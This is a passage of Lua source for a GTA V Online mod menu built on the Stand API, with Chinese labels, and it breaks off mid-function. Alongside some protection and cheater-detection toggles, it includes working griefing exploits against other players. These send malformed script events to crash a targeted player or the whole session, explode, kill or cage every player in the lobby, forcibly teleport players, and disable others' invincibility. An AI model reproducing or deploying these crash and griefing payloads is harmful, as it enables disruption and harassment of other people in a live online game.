    supercleanse = menu.action(cleanlist,"顶级清除", {"super_cleanse_cmd"}, "使用stand API删除每个找到的实体(包括玩家载具!)", function(click_type)
        menu.show_warning(supercleanse, click_type, "警告:如果重要实体被删除可能会崩溃游戏或者卡任务.继续吗?\n(注意:如果你开启了跳过警告,则不会再次显示.)", function()
            local ct = 0
            for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
                local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
                if not PED.IS_PED_A_PLAYER(driver) then
                    entities.delete_by_handle(ent)
                    ct += 1
                end
            end
            for k,ent in pairs(entities.get_all_peds_as_handles()) do
                if not PED.IS_PED_A_PLAYER(ent) then
                    entities.delete_by_handle(ent)
                end
                ct += 1
            end
            for k,ent in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(ent)
                ct += 1
            end
            local rope_alloc = memory.alloc(4)
            for i=0, 100 do 
                memory.write_int(rope_alloc, i)
                if PHYSICS.DOES_ROPE_EXIST(rope_alloc) then   
                    PHYSICS.DELETE_ROPE(rope_alloc)
                    ct += 1
                end
            end
        
            notify("超级清除已完成!" .. ct .. "删除的实体")
        end, function()
            notify("Aborted.")
        end, true)
    end)
	menu.action(cleanlist, "移除附加物", {""}, "", function()
		notification("Removing Attachments", colors.black)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)
   
	menu.divider(protex, "崩溃保护")
	menu.toggle(protex, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("切换阻止所有网络事件…", colors.green)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("切换阻止所有网络事件...", colors.red)
		end
	end)
	menu.toggle(protex, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("切换阻止所有传入同步…", colors.green)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("切换阻止所有传入同步...", colors.red)
		end
	end)
	menu.toggle(protex, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
		if on_toggle then
			notification("切换阻止所有传出同步", colors.green)
			menu.trigger_commands("desyncall on")
		else
			notification("切换阻止所有传出同步", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)
    require("lib/cqcqlib/ridicule")
menu.toggle(protex, "攻击嘲讽", {"chaofeng"}, "", function(state)
    cf = state
    _U_hack_list={}
    while cf do
        util.yield(0)
        for pid=0,31 do
            if pid~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then
                if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
                    if not _U_hack_list[pid+1] then
                        chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..chaofeng,false,true,true)
                        _U_hack_list[pid+1]=true
                    end
                else
                    _U_hack_list[pid+1]=false
                end
            end
        end
    end
end)
	menu.toggle(protex, "防崩视角", {"acc"}, "", function(on_toggle)
		if on_toggle then
			notification("切换防崩…你很安全哟", colors.green)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("关闭防崩镜头...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)
    menu.toggle(protex, "龟壳模式", {"panic"}, "没人能崩掉你", function(on_toggle)--====heezy
        guikefanghu(on_toggle)
	end)
    local anticage = menu.list(all, "防笼子", {}, "")
local alpha = 160
local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}
menu.slider(anticage, "笼子Alpha", {"cagealpha"}, "物体将具有的透明度", 0, #values, 4, 1, function(amount)
    alpha = values[amount]
end)
    menu.toggle_loop(anticage, "启用笼子拦截", {"anticage"}, "", function()
        local user = players.user_ped()
        local veh = PED.GET_VEHICLE_PED_IS_USING(user)
        local my_ents = {user, veh}
        for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
            local net_obj = memory.read_long(obj_ptr + 0xd0)
            if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
                continue
            end
            local obj_handle = entities.pointer_to_handle(obj_ptr)
            CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
            for i, data in ipairs(my_ents) do
                if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                    ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
                end
                if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                    entities.delete_by_handle(obj_handle)
                end
            end
            SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
        end
    end)
    local anti_mugger = menu.list(all, "新拦截劫匪")
menu.toggle_loop(anti_mugger, "自我抢劫防护", {}, "防止你被抢劫.", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()
        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪来自 " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)
menu.toggle_loop(anti_mugger, "Ta人抢劫防护", {}, "防止他人被抢劫.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()
        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪发送来自 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
    util.toast("你是个好人！")
end)
local DoesHaveEnemiesInArea = function(radius)
	local pos = players.get_position(players.user())
	return PED.COUNT_PEDS_IN_COMBAT_WITH_TARGET_WITHIN_RADIUS(players.user_ped(), pos.x, pos.y, pos.z, radius) > 0
end


local ExplodeEnemies = function ()
	local nearbyPeds = get_peds_in_player_range(players.user(), 500.0)
	for _, ped in ipairs(nearbyPeds) do
		if not ENTITY.DOES_ENTITY_EXIST(ped) or ENTITY.IS_ENTITY_DEAD(ped, false) then
			continue
		end

		local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(players.user_ped(), ped)
		if PED.IS_PED_IN_COMBAT(ped, players.user_ped()) or (rel == 4 or rel == 5) then
			local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
			FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 1, 1.0, true, false, 0.0)
		end
	end
end
local jishafuckman = menu.list(all, "击杀敌人")
menu.action(jishafuckman,"杀死敌人", {"killenemies"}, "杀死敌人", function()
	local timer = newTimer()
	while DoesHaveEnemiesInArea(450.0) and timer.elapsed() < 1000 do
		ExplodeEnemies()
		util.yield_once()
	end
end)
menu.toggle_loop(jishafuckman,"自动杀死敌人", {"autokillenemies"}, "", function()
	if DoesHaveEnemiesInArea(450.0) then ExplodeEnemies() end
end)
local aimkarma = menu.list(all, '瞄准惩罚', {'JSaimKarma'}, '对瞄准您的玩家做一些事情.')
menu.toggle_loop(aimkarma, '套笼子', {''}, '打你就关起来', function()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        crashPlayer(karma[userPed].ped, true, expSettings)
    end
end)
menu.toggle_loop(aimkarma, '射击', {'JSbulletAimKarma'}, '射击瞄准您的玩家.', function()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[userPed].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 0.1, 100, true, 100416529, userPed, true, false, 100.0)
        util.yield(getTotalDelay(expLoopDelay))
    end
end)
menu.toggle_loop(aimkarma, '爆炸', {'JSexpAimKarma'}, '使用您的自定义爆炸设置爆炸玩家.', function()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        explodePlayer(karma[userPed].ped, true, expSettings)
    end
end)
menu.toggle_loop(aimkarma, '禁用无敌', {'cantgod'}, '如果开着无敌的玩家瞄准你,这会通过向前推动他们的游戏画面来禁用他们的无敌模式.', function()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] and players.is_godmode(karma[userPed].pid) then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-1388926377, karmaPid, -1762807505, math.random(0, 9999)})
    end
end)
local stand_player_aim_punish =  menu.ref_by_path('World>Inhabitants>Player Aim Punishments>Anonymous Explosion', 37)
menu.action(aimkarma, 'Stand玩家瞄准惩罚', {}, '连接到Stand的玩家瞄准惩罚', function()
    menu.focus(stand_player_aim_punish)
end)
local proofsList = menu.list(all, "免疫伤害", {}, "无敌类型自定义选项")--===========by jinx=========thanks
    local immortalityCmd = menu.ref_by_path("Self>Immortality")
    for _,data in pairs(proofs) do
        menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "让您对"..data.name:lower().."伤害避免", function(toggle)
            data.on = toggle
        end)
    end
    util.create_tick_handler(function()
        local local_player = players.user_ped()
        if not menu.get_value(immortalityCmd) then
            ENTITY.SET_ENTITY_PROOFS(local_player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
        end
    end)
    local Punishment = menu.list(all, "不要试图挑战神", {}, "", function(); end)
    menu.toggle_loop(Punishment, '来自神的崩溃', {''}, '试图瞄准你的凡人都将受到神的惩罚', function()
        local userPed = players.user_ped()
        if playerIsTargetingEntity(userPed) and karma[userPed] then
            local karmaPid = karma[userPed].pid
    util.trigger_script_event(1 << karmaPid, { -555356783, karmaPid ,85952,99999,52682274855,526822745 })
    util.trigger_script_event(1 << karmaPid, { 526822748, karmaPid ,78552,99999 ,7949161,789454312})
    util.trigger_script_event(1 << karmaPid, { -66669983, karmaPid ,526822748,555555, math.random(80521,2959749521) })
    util.trigger_script_event(1 << karmaPid, { -1733737974, karmaPid ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
    util.trigger_script_event(1 << karmaPid, { -1529596656, karmaPid ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
    util.trigger_script_event(1 << karmaPid, { -8965204809, karmaPid ,795221,59486,48512151,-9545440 })
        end
    end)
    menu.toggle_loop(Punishment, '来自神的邀请', {''}, '试图瞄准你的凡人都将受到神的邀请（海滩）', function()
        local userPed = players.user_ped()
        if playerIsTargetingEntity(userPed) and karma[userPed] then
            local karmaPid = karma[userPed].pid
            util.trigger_script_event(1 << karmaPid, {1214823473 ,1, 0, 0, 4,0,karmaPid, karmaPid})
        end
    end)
      menu.toggle_loop(Punishment, '来自神的暴怒', {''}, '试图攻击你的凡人都将受到神的严厉惩罚（将会崩溃整个战局！！！）', function()
            local userPed = players.user_ped()
            if playerIsTargetingEntity(userPed) and karma[userPed] then
                player1(karma[userPed].ped, true, expSettings)
            end
        end)
menu.divider(all, "作弊者检测")
menu.toggle_loop(all, "未发布载具检测", {}, "", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(PlayerID)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(PlayerID) .. " 正在驾驶未发布载具,很有可能是作弊者")
            end
        end
    end
end)
menu.toggle_loop(all, "玩家无敌检测", {}, "无敌玩家将显示为调试文本.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(PlayerID) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(player) and get_transition_state(PlayerID) ~= 0 and get_interior_player_is_in(PlayerID) == interior then
                util.draw_debug_text(players.get_name(PlayerID) .. " 是无敌,很有可能是作弊者")
            end
        end
    end 
end)
menu.toggle_loop(all, "无敌模式检测", {}, "检测是否在使用无敌.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(pid) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_spawn_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                util.draw_debug_text(players.get_name(pid) .. "是无敌,很有可能是作弊者")
                break
            end
        end
    end 
end)
menu.toggle_loop(all, "载具无敌检测", {}, "检测载具是否在使用无敌.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_spawn_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "载具处于无敌模式")
                    break
                end
            end
        end
    end 
end)
menu.toggle_loop(all, "改装武器检测", {}, "是否有人使用改装武器.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(pid) .. " 使用修改过的武器 " .. "(" .. hash .. ")")
                break
            end
        end
    end
end)
menu.toggle_loop(all, "改装载具检测", {}, "是否有人使用无敌载具.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " 正在驾驶改装载具")
                break
            end
        end
    end
end)
menu.toggle_loop(all, "自由镜头检测", {}, "是否有人开启自由镜头（无碰撞）", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(pid)
        util.yield()
        local currentpos = players.get_position(pid)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(pid)
        and get_interior_player_is_in(pid) == 0 and get_spawn_state(pid) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(pid) .. " 是无碰撞")
            break
        end
    end
end)
menu.toggle_loop(all, "超级驾驶检测", {}, "是否有在修改载具车速", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 200 and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") or players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) then
            local PedID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
            util.toast(players.get_name(PedID) .. " 正在使用超级驾驶")
            break
        end
    end
end)
menu.toggle_loop(all, "观看检测", {}, "是否有人在观看你.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if not util.is_session_transition_active() and get_spawn_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                    util.toast(players.get_name(pid) .. " 正在观看你")
                    break
                end
            end
        end
    end
end)
menu.divider(all, "全局恶搞娱乐")
sn = menu.list(all, "恶搞娱乐选项", {}, "", function(); end)
menu.divider(sn, "全局娱乐")
menu.toggle_loop(sn, '禁飞区', {'JSnoFly'}, '强迫所有乘坐飞行载具的玩家回到地面.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, pid in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
        if ENTITY.IS_ENTITY_IN_AIR(playerVehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY(playerVehicle, 1, 0, 0, -0.8, 0, 0, 0.5, 0, false, false, true)
            if notifications then
                menu.toast('已应用强制返回地面')
            end
        end
    end
end)
menu.divider(sn, "全局恶搞")
menu.action(sn, "发送所有玩家海滩", {}, "", function () 
    for pid = 0, 32 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {1214823473 ,1, 0, 0, 4,0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end)
menu.action(sn, "发送所有玩家岛屿", {}, "", function () 
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {1214823473, 1, 0, 0, 1, 1,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end)
menu.action(sn, "传送所有人的车辆到海洋", {""}, "", function()
    allsqhy()
    end)
    menu.action(sn, "传送所有人的车辆到花园银行", {""}, "", function()
        allswre()
        end)
menu.action(sn, "全局公寓邀请", {}, "", function () 
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {-1390976345, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end)
menu.action(sn, "困住所有玩家", {}, "", function () 
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                pos.z = pos.z + 0.95  
                local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                pos1.z = pos1.z - 0.90
                local cage = util.joaat("prop_feeder1_cr")
                STREAMING.REQUEST_MODEL(cage)
                OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos.x, pos.y ,pos.z , true, true)
                OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos1.x, pos1.y ,pos1.z , true, true)
        end
    end
end)
menu.action(sn, "车辆电磁脉冲", {}, "让每个人的车都熄火", function ()
    xihuoba()
end)
menu.action(sn, "移除车辆无敌", {}, "移除部分玩家车辆无敌", function ()
    yichuvehiclegod()
end)
menu.action(sn, "防空警报", {"AirDefencesSound"}, "", function()
    fkjb()
    end)
    menu.toggle_loop(sn, "震动所有人屏幕", {"shakeeveryone"}, "让每个人的屏幕震动", function()
        for k,v in pairs(players.list(true, true, true)) do
            shake_player(v, 5000)
            util.yield()
        end
        util.yield(1000)
    end)
    menu.action(sn, "无声杀人", {"killeveryone"}, "无声地杀死所有人", function()
        wushengsharen()
    end)
    menu.action(sn, "被动杀人", {"passivekilleveryone"}, "被动模式杀死所有人", function()
        beidongsharen()
    end)
menu.action(sn, '爆炸所有人', {'JSexplodeAll'}, '爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, pid in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explodePlayer(playerPed, false, expSettings)
    end
end)
explodeLoopAll = menu.toggle_loop(sn, '循环爆炸所有人', {'JSexplodeAllLoop'}, '不断的爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, pid in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explodePlayer(playerPed, true, expSettings)
    end
    util.yield(getTotalDelayabcd(expLoopDelay))
end)
menu.action(sn, "给每个人刷一辆mk2", {"oppressorparty"}, "让战局每个人都当马克狗(军绿色)", function ()
    shuamk2()
end)
menu.action(sn, "噪音", {"bedsound"}, "在战局中播放大量的噪音", function()
    zaoyin()
    end)
local announce_options = { "最佳抢劫目标", "最穷的玩家", "最富的玩家", "最性奋的玩家"}
menu.list_action(sn, "宣布", {"announcestat"}, "", announce_options, function(index, value, click_type)
    local ret = nil
    pluto_switch index do 
        case 1: 
            ret = get_best_mug_target()
            break
        case 2: 
            ret = get_poorest_player()
            break
        case 3:
            ret = get_richest_player()
            break
        case 4:
            ret = get_horniest_player()
            break
    end
    if ret ~= nil then
        chat.send_message(ret, false, true, true)
    end
end)
function draw_string(s, x, y, scale, font)
	HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.SET_TEXT_FONT(font or 0)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end
local fps = 0
util.create_thread(function()
    while true do
        fps = math.ceil(1/SYSTEM.TIMESTEP())
        util.yield(500)
    end
end)
local replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
local pedInterface = memory.read_long(replayInterface + 0x0018)
local vehInterface = memory.read_long(replayInterface + 0x0010)
local objectInterface = memory.read_long(replayInterface + 0x0028)
local pickupInterface = memory.read_long(replayInterface + 0x0020)
function zhujixvlie()
inviciamountint = 0
            for pid = 0, 31 do
                if players.exists(pid) and pid ~= players.user() then
                    local pped = players.user_ped(pid)
                    if pped ~= 0 then
                        if players.is_marked_as_modder(pid) then --is_marked_as_modder
                            inviciamountint = inviciamountint + 1
                        end
                    end
                end
local ente
                    local ent1e = players.user_ped()
                    local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                    if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                        ente = ent2e
                    else
                        ente = ent1e
                    end
                    local speede = ENTITY.GET_ENTITY_SPEED(ente)
                    local speedcalce = speede * 3.6
                    myspeed1e = math.ceil(speedcalce)
            end
                inviciamountintt = inviciamountint
            draw_string(string.format("~italic~~bold~~p~"..myspeed1e.." ~bold~~p~KM/H"), 0.163,0.695, 0.4,1)
            draw_string(string.format("~italic~~bold~~o~FPS: ~g~"..fps), 0.163,0.722, 0.4,1)
            draw_string(string.format("~italic~~bold~~y~时间:~y~"..os.date("%X")), 0.163,0.749, 0.4,1)    
            draw_string(string.format("~italic~~bold~~g~战局人数: ~g~"..#players.list()), 0.163,0.776, 0.4,1) 
            draw_string(string.format("~italic~~bold~~r~攻击人数: ~r~"..inviciamountintt), 0.163,0.803, 0.4,1) 
            draw_string(string.format("~italic~~bold~~y~战局主机: ~y~"..players.get_name(players.get_host())), 0.163,0.830, 0.4,1)
            draw_string(string.format("~italic~~bold~~b~脚本主机: ~b~"..players.get_name(players.get_script_host())), 0.163,0.857, 0.4,1)
            draw_string(string.format("~italic~~bold~~o~Ped: ~o~"..memory.read_int(pedInterface + 0x0110).."/"..memory.read_int(pedInterface + 0x0108)), 0.163,0.884, 0.4,1)
            draw_string(string.format("~italic~~bold~~p~载具: ~p~"..memory.read_int(vehInterface + 0x0190).."/"..memory.read_int(vehInterface + 0x0188)), 0.163,0.911, 0.4,1)
            draw_string(string.format("~italic~~bold~~b~物体: ~b~"..memory.read_int(objectInterface + 0x0168).."/"..memory.read_int(objectInterface + 0x0160)), 0.163,0.938, 0.4,1)
            draw_string(string.format("~italic~~bold~~o~可拾取物: ~o~"..memory.read_int(pickupInterface + 0x0110).."/"..memory.read_int(pickupInterface + 0x0108)), 0.163,0.965, 0.4,1)
end
function get_player_vehicle_in_control(pid, opts)
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos1 = ENTITY.GET_ENTITY_COORDS(target_ped)
    local pos2 = ENTITY.GET_ENTITY_COORDS(my_ped)
    local dist = SYSTEM.VDIST2(pos1.x, pos1.y, 0, pos2.x, pos2.y, 0)
    local was_spectating = NETWORK.NETWORK_IS_IN_SPECTATOR_MODE()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
    if opts and opts.near_only and vehicle == 0 then
        return 0
    end
    if vehicle == 0 and target_ped ~= my_ped and dist > 1500 and not was_spectating then
        show_busyspinner("AUTO_SPECTATE")
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target_ped)
        local loop = (opts and opts.loops ~= nil) and opts.loops or 30
        while vehicle == 0 and loop > 0 do
            util.yield(100)
            vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
            loop = loop - 1
        end
        HUD.BUSYSPINNER_OFF()
    end
    if vehicle > 0 then
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            return vehicle
        end
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vehicle)
        local has_control_ent = false
        local loops = 15
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        while not has_control_ent do
            has_control_ent = NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            loops = loops - 1
            util.yield(15)
            if loops <= 0 then
